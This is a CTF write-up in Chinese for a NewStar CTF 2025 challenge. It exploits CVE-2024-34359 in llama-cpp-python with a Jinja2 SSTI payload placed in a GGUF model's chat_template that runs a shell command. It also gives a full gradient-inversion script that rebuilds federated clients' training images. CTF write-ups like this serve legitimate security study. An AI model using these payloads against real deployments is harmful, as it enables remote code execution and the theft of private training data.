---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# AI HACKER

> SafeLLM Hub 一点都不 Safe :(（访问/FLAG 获取题目任务）

这道题的知识点是 GGUF 投毒导致的 SSTI 注入，《Deep leakage by gradients》

首先到主界面，我们发现题目给了一个内置模型，并且用户可以自己上传 GGUF 格式的模型并与 LLM 模型交互。
不少选手可能会认为这题是 Prompt Injection。

但是经过一系列探索，这个 LLM 已经无法回答普通的大整数加法问题。据题目提示，我们要在指定目录下放置一个 `orange` 文件。

经过探索，在 `/api/info` 下可以发现该平台泄露的组件版本信息。
![上传提示词文件](/assets/images/wp/2025/week5/ai-hacker_1.png)

通过搜索，我们发现 llama-cpp-python 出现过一个加载模型导致的漏洞（CVE-2024-34359）。
我们找到发现该漏洞的作者写的 [文章](https://0reg.dev/blog/from-gguf-model-format-metadata-rce-to-state-of-the-art-nlp-project-rces)

阅读文章后，可以大致了解攻击手法：通过修改 `chat_template` 段的数据导致 SSTI 注入，最后 RCE 来创建文件。构造如下 EXP：

```bash
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("touch /tmp/xxxxxxxxxxxx/orange")}}{%endif%}{% endfor %}
```

![模型返回分析结果](/assets/images/wp/2025/week5/ai-hacker_2.png)

成功拿到 `flag1` 和 `flag2` 的地址。

![提示词注入结果](/assets/images/wp/2025/week5/ai-hacker_3.png)

`flag2` 是一个 pth 文件，使用 Netron 加载并观察模型参数。
![获得 AI 题 FLAG](/assets/images/wp/2025/week5/ai-hacker_4.png)
从命名可以看出来 这里主要想考查梯度泄露攻击，共有12个客户端 我们一个个处理即可
网上有不少相关exp 我们稍作修改即可

```python
import torch
import torch.nn as nn
import torch.optim as optim
import matplotlib.pyplot as plt

def simple_multi_attack(model_path):
    checkpoint = torch.load(model_path, map_location='cpu')

    class SimpleModel(nn.Module):
        def __init__(self):
            super().__init__()
            self.conv_layers = nn.Sequential(
                nn.Conv2d(3, 32, 3, padding=1), nn.ReLU(), nn.MaxPool2d(2),
                nn.Conv2d(32, 64, 3, padding=1), nn.ReLU(), nn.MaxPool2d(2),
                nn.Conv2d(64, 64, 3, padding=1), nn.ReLU()
            )
            self.classifier = nn.Sequential(
                nn.Flatten(),
                nn.Linear(64 * 8 * 8, 128), nn.ReLU(),
                nn.Linear(128, 10)
            )

        def forward(self, x):
            x = self.conv_layers(x)
            return self.classifier(x)

    model = SimpleModel()
    model.load_state_dict(checkpoint['model_state_dict'])
    model.eval()

    gradients = checkpoint['client_gradients']

    print(f"开始攻击 {len(gradients)} 个客户端")

    for client_idx, grad in enumerate(gradients):
        print(f"\n 攻击客户端 {client_idx}...")
        for round_idx in range(10):
            print(f"  第 {round_idx + 1} 轮")

            if round_idx == 0:
                dummy_data = torch.randn(1, 3, 32, 32, requires_grad=True)
            else:
                dummy_data = current_data + torch.randn_like(current_data) * 0.1
                dummy_data = torch.clamp(dummy_data, 0, 1)
                dummy_data.requires_grad_(True)

            dummy_label = torch.randn(1, 10, requires_grad=True)
            optimizer = optim.LBFGS([dummy_data, dummy_label], lr=0.1)

            for step in range(100):
                def closure():
                    optimizer.zero_grad()
                    pred = model(dummy_data)
                    loss = nn.functional.cross_entropy(pred, dummy_label.softmax(dim=1))
                    dummy_grad = torch.autograd.grad(loss, model.parameters(), create_graph=True)

                    grad_diff = 0
                    for g1, g2 in zip(dummy_grad, grad):
                        if g2 is not None:
                            grad_diff += ((g1 - g2) ** 2).sum()

                    grad_diff.backward()
                    return grad_diff

                optimizer.step(closure)
                dummy_data.data = torch.clamp(dummy_data.data, 0, 1)

            current_data = dummy_data.data.clone()

            # 显示每轮结果
            image = current_data.detach().squeeze().permute(1, 2, 0).cpu().numpy()
            image = (image - image.min()) / (image.max() - image.min())

            plt.figure(figsize=(3, 3))
            plt.imshow(image)
            plt.title(f"Client {client_idx} - Round {round_idx + 1}")
            plt.axis('off')
            plt.show()

    print("攻击完成！请查看图像并记录字符")

simple_multi_attack('pth path')
```
